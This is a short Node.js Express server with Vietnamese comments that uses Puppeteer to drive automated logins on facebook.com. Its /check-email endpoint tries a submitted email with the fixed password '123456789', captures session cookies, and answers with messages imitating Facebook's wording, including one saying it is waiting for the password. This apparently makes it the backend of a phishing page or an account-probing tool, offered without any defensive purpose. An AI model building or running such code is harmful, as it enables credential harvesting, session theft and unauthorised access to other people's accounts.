const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');

const app = express();
const port = 5003;

// Đường dẫn lưu file cookies
const COOKIES_FILE_PATH = 'cookies.json';
const url = 'https://www.facebook.com/login';

app.use(bodyParser.json());

async function createHeadlessBrowser() {
  const browser = await puppeteer.launch({
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe', // Điều chỉnh đường dẫn tới Chrome ở đây
  });
    const page = await browser.newPage();
  return { browser, page };
}

async function loginToFacebook(email, password, param) {
  const { browser, page } = await createHeadlessBrowser();

  await page.goto(url);
  await page.type('#email', email);
  await page.type('#pass', password);
  await page.click('[type="submit"]');

  await page.waitForTimeout(5000); // Đợi 5 giây

  const isLoginSuccessful = !(await page.url()).includes(param);
  const cookies = await page.cookies();
  await browser.close();

  return { isLoginSuccessful, cookies };
}

app.post('/check-email', async (req, res) => {
  const { email } = req.body;
  const defaultPassword = '123456789';

  const { isLoginSuccessful } = await loginToFacebook(email, defaultPassword, 'login_attempt');

  if (isLoginSuccessful) {
    res.status(200).json({ message: 'Email và số điện thoại kết nối với Facebook, chờ nhập mật khẩu...', status: 200, email });
  } else {
    res.status(400).json({ message: 'Số điện thoại bạn nhập không kết nối với bất kỳ tài khoản nào. Tìm tài khoản của bạn và đăng nhập.', status: 400 });
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
